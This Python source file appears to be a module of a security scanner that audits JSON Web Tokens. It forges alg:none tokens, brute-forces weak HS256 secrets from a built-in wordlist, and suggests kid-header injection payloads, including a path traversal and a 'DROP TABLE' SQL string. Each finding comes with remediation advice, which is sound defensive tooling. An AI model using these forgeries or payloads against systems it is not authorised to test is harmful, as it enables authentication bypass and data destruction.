"""JWT auditor — alg:none attack, weak-secret brute-force, kid injection."""

from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import json
import uuid
from pathlib import Path
from typing import Any

from dribik.models import CVSSVector, Finding


def _b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _decode_jwt(token: str) -> tuple[dict[str, Any], dict[str, Any], str] | None:
    """Split JWT into (header, payload, signature_b64)."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    try:
        header: dict[str, Any] = json.loads(_b64url_decode(parts[0]))
        payload: dict[str, Any] = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except (json.JSONDecodeError, binascii.Error, UnicodeDecodeError, ValueError):
        return None


def _load_wordlist() -> list[str]:
    p = Path(__file__).parent.parent / "payloads" / "jwt_secrets.txt"
    if p.exists():
        return [ln.strip() for ln in p.read_text(encoding="utf-8").splitlines()
                if ln.strip() and not ln.startswith("#")]
    return _BUILTIN_SECRETS


_BUILTIN_SECRETS = [
    "secret", "password", "123456", "admin", "test", "changeme",
    "mysecretkey", "jwt_secret", "secretkey", "your-secret-key",
    "supersecret", "secret123", "", "null", "none", "key",
    "p@ssw0rd", "letmein", "qwerty", "abc123", "default",
    "flask-secret", "django-insecure", "development", "production",
]


def _verify_hs256(token_parts: list[str], secret: str) -> bool:
    try:
        signing_input = f"{token_parts[0]}.{token_parts[1]}".encode("ascii")
        expected = hmac.new(
            secret.encode("utf-8"),
            signing_input,
            hashlib.sha256,
        ).digest()
        actual = _b64url_decode(token_parts[2])
        return hmac.compare_digest(expected, actual)
    except (ValueError, binascii.Error, UnicodeError):
        return False


def audit_jwt(
    token: str,
    *,
    secrets: list[str] | None = None,
    asset_id: str = "",
) -> list[Finding]:
    """
    Audit a JWT token for common vulnerabilities:
      1. alg:none — signature bypass
      2. Weak HMAC secret brute-force
      3. kid header injection hint

    Returns a list of Finding objects.
    """
    decoded = _decode_jwt(token)
    if decoded is None:
        return []

    header, payload, sig = decoded
    parts = token.strip().split(".")
    findings: list[Finding] = []

    # ---- 1. alg:none attack ----
    alg = header.get("alg", "").lower()
    if alg != "none":
        # Craft a none-alg token and flag the configuration risk
        none_header = {**header, "alg": "none"}
        none_h_b64 = _b64url_encode(json.dumps(none_header, separators=(",", ":")).encode())
        pay_b64 = parts[1]
        none_token = f"{none_h_b64}.{pay_b64}."
        findings.append(
            Finding(
                id=f"JWT-{uuid.uuid4().hex[:8].upper()}",
                title="JWT: alg:none attack surface",
                severity="high",
                vuln_type="JWT",
                asset_id=asset_id or "jwt-token",
                summary=(
                    f"Token uses algorithm '{header.get('alg')}'. "
                    "If the server accepts alg:none, signature verification is skipped entirely."
                ),
                proof_of_concept=(
                    f"Original token algorithm: {header.get('alg')}\n"
                    f"Crafted none-alg token:\n{none_token}\n\n"
                    "Submit this token to the target API to test if it is accepted."
                ),
                remediation=(
                    "Explicitly reject the 'none' algorithm server-side. "
                    "Use a JWT library that requires algorithm whitelisting. "
                    "Never rely on the token's own 'alg' header to select verification logic."
                ),
                references=[
                    "https://portswigger.net/web-security/jwt",
                    "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                ],
                cwe_id="CWE-347",
                cvss=CVSSVector(vector_string="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
            )
        )

    # ---- 2. Weak secret brute-force (HS256 only) ----
    if alg == "hs256":
        wordlist = secrets or _load_wordlist()
        for secret in wordlist:
            if _verify_hs256(parts, secret):
                findings.append(
                    Finding(
                        id=f"JWT-{uuid.uuid4().hex[:8].upper()}",
                        title="JWT: Weak HMAC secret discovered",
                        severity="critical",
                        vuln_type="JWT",
                        asset_id=asset_id or "jwt-token",
                        summary=(
                            "The JWT HS256 secret is weak and was brute-forced. "
                            "An attacker can forge arbitrary tokens."
                        ),
                        proof_of_concept=f"Secret found: `{secret}`",
                        remediation=(
                            "Replace the secret with a cryptographically random 256-bit key. "
                            "Rotate all existing tokens immediately. "
                            "Consider switching to RS256 (asymmetric) for better key management."
                        ),
                        references=[
                            "https://portswigger.net/web-security/jwt",
                            "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
                        ],
                        cwe_id="CWE-321",
                        cvss=CVSSVector(vector_string="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
                        response_diff_agreement=1.0,
                    )
                )
                break

    # ---- 3. kid (Key ID) injection hint ----
    if "kid" in header:
        kid_val = str(header["kid"])
        findings.append(
            Finding(
                id=f"JWT-{uuid.uuid4().hex[:8].upper()}",
                title="JWT: 'kid' header present — check for injection",
                severity="medium",
                vuln_type="JWT",
                asset_id=asset_id or "jwt-token",
                summary=(
                    f"The JWT contains a 'kid' (Key ID) header with value '{kid_val}'. "
                    "If the server uses this value to look up signing keys in a database or filesystem, "
                    "it may be vulnerable to SQL injection or path traversal."
                ),
                proof_of_concept=(
                    f"kid value: {kid_val}\n"
                    "Try: kid = '../../../../dev/null' or kid = '; DROP TABLE keys--'"
                ),
                remediation=(
                    "Validate the 'kid' value against a strict allowlist. "
                    "Never use the kid value directly in a file path or SQL query."
                ),
                references=["https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal"],
                cwe_id="CWE-20",
                cvss=CVSSVector(vector_string="AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"),
            )
        )

    return findings
